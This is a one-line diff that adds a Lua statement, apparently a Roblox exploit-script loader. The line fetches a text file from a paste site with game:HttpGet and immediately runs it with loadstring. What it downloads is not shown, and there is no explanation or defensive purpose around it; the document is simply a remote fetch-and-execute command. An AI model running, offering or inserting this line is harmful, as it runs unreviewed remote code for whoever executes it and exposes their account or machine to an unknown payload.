@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://paste.website/p/e219319c-0390-4d75-8487-bea07a7b731b.txt"))();
